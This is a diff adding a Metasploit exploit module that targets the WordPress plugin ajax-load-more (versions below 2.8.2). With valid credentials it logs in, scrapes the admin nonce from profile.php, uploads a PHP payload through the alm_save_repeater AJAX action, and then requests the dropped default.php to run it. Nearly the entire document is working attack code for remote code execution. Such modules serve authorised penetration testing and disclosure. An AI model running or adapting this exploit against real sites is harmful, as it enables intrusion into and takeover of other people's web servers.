@@ -1,0 +1,139 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  
+  include Msf::Exploit::FileDropper
+  include Msf::HTTP::Wordpress
+  
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'WordPress Plugin ajax-load-more Authenticated Arbitrary File Upload',
+      'Description'     => %q{
+          This module exploits an authenticated file upload vulnerability in Wordpress plugin
+ajax-load-more versions < 2.8.2. Valid wordpress credentials are required for the exploit to work.
+          Tested with version v2.7.3. (May work on older versions).
+        },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Pizza Hat Hacker <PizzaHatHacker[A]gmail[.]com', # Vulnerability discovery & Metasploit module
+        ],
+      'References'      =>
+        [
+          ['WPVDB', '8209']
+        ],
+      'DisclosureDate'  => 'Oct 02 2015',
+      'Platform'        => 'php',
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [['ajax-load-more', {}]],
+      'DefaultTarget'   => 0
+    ))
+	
+	register_options(
+    [
+         OptString.new('WP_USER', [true, 'A valid wordpress username', nil]),
+         OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])
+    ], self.class)
+  end
+  
+  def user
+    datastore['WP_USER']
+  end
+  
+  def password
+    datastore['WP_PASSWORD']
+  end
+  
+  def check
+    # Check plugin version
+	ver = check_plugin_version_from_readme('ajax-load-more, 2.8.2')
+	if ver
+	  return Exploit::CheckCode::Appears
+	end
+	return Exploit::CheckCode::Safe
+  end
+  
+  def exploit
+    # Wordpress login
+    print_status("#{peer} - Trying to login as #{user}")
+    cookie = wordpress_login(user, password)
+    if cookie.nil?
+      print_error("#{peer} - Unable to login as #{user}")
+      return
+    end
+    
+    url = normalize_uri(wordpress_url_backend, 'profile.php')
+    print_status("#{peer} - Retrieving WP nonce from #{url}")
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => url,
+      'cookie'   => cookie
+    })
+    
+    if res and res.code == 200
+      # "alm_admin_nonce":"e58b6d536d"
+      res.body =~ /\"alm_admin_nonce\":\"([0-9a-f]+)\"/
+      wp_nonce = $1
+      if wp_nonce
+        print_good("#{peer} Found ajax-load-more wp_nonce value : #{wp_nonce}")
+      else
+        vprint_error("#{peer} #{res.body}")
+        fail_with(Failure::Unknown, "#{peer} - Unable to retrieve wp_nonce from user profile page.")
+      end
+    else
+      fail_with(Failure::Unknown, "#{peer} - Unexpected server response (code #{res.code}) while accessing user profile page.")
+    end
+
+    print_status("#{peer} - Trying to upload payload")
+    
+    # Generate MIME message
+    data = Rex::MIME::Message.new
+    data.add_part('alm_save_repeater', nil, nil, 'form-data; name="action"')
+    data.add_part(wp_nonce, nil, nil, 'form-data; name="nonce"')
+    data.add_part('default', nil, nil, 'form-data; name="type"')
+    data.add_part("#{rand_text_alpha_lower(3)}", nil, nil, 'form-data; name="repeater"')
+    data.add_part(payload.encoded, nil, nil, 'form-data; name="value"')
+
+    print_status("#{peer} - Uploading payload")
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(wordpress_url_admin_ajax),
+      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
+      'data'     => data.to_s,
+      'cookie'   => cookie
+    })
+    
+    filename = 'default.php'
+    if res
+      if res.code == 200
+        lines = res.body.split("\n")
+        if lines.length > 0
+          message = lines[lines.length - 1]
+          if message.include?('Template Saved Successfully')
+            register_files_for_cleanup(filename)
+          else
+            vprint_error("#{peer} - Unexpected web page content : #{message}")
+          end
+        else
+          fail_with(Failure::Unknown, "#{peer} - Unexpected empty server response")
+        end
+      else
+        fail_with(Failure::Unknown, "#{peer} - Unexpected HTTP response code : #{res.code}")
+      end
+    else
+      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+    end
+    
+    print_status("#{peer} - Calling uploaded file #{filename}")
+    send_request_cgi(
+      'uri'    => normalize_uri(wordpress_url_plugins, 'ajax-load-more', 'core', 'repeater', filename)
+    )
+  end
+end
